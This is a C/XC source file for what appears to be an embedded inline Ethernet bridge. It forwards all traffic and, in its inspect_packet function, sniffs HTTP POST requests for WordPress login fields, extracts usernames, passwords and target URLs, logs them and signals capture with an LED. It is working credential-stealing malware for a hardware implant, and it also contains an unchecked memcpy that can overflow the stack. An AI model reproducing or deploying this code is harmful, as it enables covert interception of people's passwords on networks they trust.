#include <platform.h>
#include <led.h>
#include <uart.h>
#include <stdio.h>
#include <string.h>
#include "ethernet.h"
#include "stats.h"
#include "packet_types.h"
#include "datalog.h"

void inspect_packet(const unsigned char rxbuf[nbytes], unsigned nbytes, client interface led_if led, client interface info_log_if log_if);

[[combinable]]
void packet_handler(client ethernet_cfg_if cfg,
                 client ethernet_rx_if rx,
                 client ethernet_tx_if tx,
                 client interface led_if led,
                 server interface stats_if stats,
                 client interface info_log_if log_if
                 )
{
  unsigned stat_rx_total=0, stat_tx_total=0;
  led.blink(3);

  while (1)
  {
    select {
    case rx.packet_ready():
      unsigned char rxbuf[ETHERNET_MAX_PACKET_SIZE];
      //unsigned char txbuf[ETHERNET_MAX_PACKET_SIZE];
      ethernet_packet_info_t packet_info;

      rx.get_packet(packet_info, rxbuf, ETHERNET_MAX_PACKET_SIZE);
      stat_rx_total++;
      
      tx.send_packet(rxbuf, packet_info.len, ETHERNET_ALL_INTERFACES);
      stat_tx_total++;

      if (packet_info.len > 600 && packet_info.len < 800 && is_valid_tcp_packet(rxbuf, packet_info.len))
      {
          inspect_packet(rxbuf, packet_info.len, led, log_if);
      }

      led.blink(1);
      break;
    case stats.reset():
      stat_rx_total = 0;
      stat_tx_total = 0;
      break;
    case stats.rx_total() -> unsigned stat:
      stat = stat_rx_total;
      break;
    case stats.tx_total() -> unsigned stat:
      stat = stat_tx_total;
      break;
    }
  }
}


void inspect_packet(const unsigned char rxbuf[nbytes], unsigned nbytes, client interface led_if led, client interface info_log_if log_if)
{
    char *loginPtr;
    char *passwordPtr;
    char *wpsubmitPtr;
    int loginSize, passwordSize;

    if (memmem(rxbuf + TCP_PAYLOAD, (nbytes - TCP_PAYLOAD) >= 10 ? 10 : (nbytes - TCP_PAYLOAD), "POST", 4) == NULL)
    {
        return;
    }

    loginPtr = memmem(rxbuf + TCP_PAYLOAD, nbytes - TCP_PAYLOAD, "log=", 4);

    if (loginPtr != NULL)
    {
        passwordPtr = memmem(rxbuf, nbytes, "&pwd=", 5);

        if (passwordPtr != NULL)
        {
            wpsubmitPtr = memmem(rxbuf, nbytes, "&wp-submit=", 11);

            if (wpsubmitPtr != NULL)
            {
                // todo bounds check!
                char username[INFO_LOG_ENTRY_FIELD_LEN];
                char password[INFO_LOG_ENTRY_FIELD_LEN];
                char path[INFO_LOG_ENTRY_FIELD_LEN];
                char host[INFO_LOG_ENTRY_FIELD_LEN];
                char url[INFO_LOG_ENTRY_FIELD_LEN];

                loginPtr += 4;
                loginSize = (int) (passwordPtr - loginPtr);
                passwordPtr += 5;
                passwordSize = (int) (wpsubmitPtr - passwordPtr);

                memcpy(username, loginPtr, loginSize);
                memcpy(password, passwordPtr, passwordSize);
                username[loginSize] = '\0';
                password[passwordSize] = '\0';

                snprintf(path, INFO_LOG_ENTRY_FIELD_LEN, "No Path");
                snprintf(host, INFO_LOG_ENTRY_FIELD_LEN, "No Path");

                unsafe
                {
                    char * unsafe token;
                    char * unsafe savePtr;
                    int loop_count = 0, next_type=0;

                    while (loop_count < 10) // rude protection against mismatch, tcp payload is not null terminated
                    {
                        if (loop_count==0)
                        {
                            token = strtok_r((char * alias)&rxbuf[TCP_PAYLOAD], " \r\n", &savePtr);
                        }
                        else
                        {
                            token = strtok_r(NULL, " \r\n", &savePtr);
                        }

                        if (token==NULL) break;

                        if (next_type==1)
                        {
                            strncpy(path, (char * alias)token, INFO_LOG_ENTRY_FIELD_LEN);
                            next_type=0;
                        }
                        else if (next_type==2)
                        {
                            strncpy(host, (char * alias)token, INFO_LOG_ENTRY_FIELD_LEN);
                            next_type=0;
                            break;
                        }
                        else
                        {
                            if (strcmp((char * alias)token, "POST") == 0)
                            {
                                next_type=1;
                            }
                            else if (strcmp((char * alias)token, "Host:") == 0)
                            {
                                next_type=2;
                            }
                        }

                        loop_count++;
                    }
                }

                snprintf(url, INFO_LOG_ENTRY_FIELD_LEN, "%s%s", host, path);

                log_if.add_entry(username, password, url);

                led.led_on();
                led.blink_enable_after(2000);
            }

        }
    }
}
